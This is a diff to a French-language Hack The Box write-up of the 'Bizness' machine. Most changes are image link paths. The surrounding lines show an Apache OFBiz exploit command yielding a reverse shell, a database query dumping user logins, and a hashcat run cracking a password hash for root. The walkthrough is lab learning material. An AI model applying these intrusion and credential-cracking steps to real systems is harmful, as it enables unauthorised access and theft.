@@ -52,7 +52,7 @@
     <main id="content" class="main-content" role="main">
       <h1 id="foothold">Foothold</h1>
 
-<p><img src="Pasted%20image%2020260503171038.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318085145.png"></span></p>
 
 <p>On arrive sur la page de “Bizness incorporate”. Alors évidemment, en descendant suffisamment, on peut lire que le framework est Apache OfBiz.</p>
 
@@ -63,9 +63,9 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py --url https://bizness.htb --cmd 'id'
 </code></pre></div></div>
 <p>on nous dit de vérifier la sortie de la commande. Il ne faut pas oublier bien sûr qu’il y a une redirection vers https donc il faut bien utiliser cette origine. Aussi vite que ça on a notre revshell.
-<img src="Pasted%20image%2020260503171046.png" alt=""></p>
+<span class="invalid-wiki-link"><span class="invalid-wiki-link">![[Pasted image 20260318095918.png]]</span></span></p>
 
-<p><img src="Pasted%20image%2020260503171054.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318095927.png"></span></p>
 
 <p>On upgrade notre shell</p>
 
@@ -84,7 +84,7 @@ alias ls='ls $LS_OPTIONS'
 export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
 </code></pre></div></div>
 
-<p><img src="Pasted%20image%2020260503171102.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318100022.png"></span></p>
 
 <h1 id="privilege-escalation-to-root">Privilege Escalation to root</h1>
 
@@ -108,9 +108,9 @@ ij
 show tables;
 select * from OFBIZ.USER_LOGIN;
 </code></pre></div></div>
-<p><img src="Pasted%20image%2020260503171110.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319101234.png"></span></p>
 
-<p><img src="Pasted%20image%2020260503171119.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319101849.png"></span></p>
 
 <p>On trouve un mot de passe:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
@@ -186,7 +186,7 @@ b'b8fd3f41a541a435857a8f3e751cc3a91c174362'
 hashcat -a 0 -m 120 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
 </code></pre></div></div>
 
-<p><img src="Pasted%20image%2020260503171125.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112112.png"></span></p>
 
 <p>Et on trouve le mot de passe</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monkeybizness
@@ -197,9 +197,9 @@ hashcat -a 0 -m 120 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
 </code></pre></div></div>
 <p>Et ça fonctionne, on a notre root shell!</p>
 
-<p><img src="Pasted%20image%2020260503171130.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112237.png"></span></p>
 
-<p><img src="Pasted%20image%2020260503171648.png" alt=""></p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112325.png"></span></p>
 
 
 
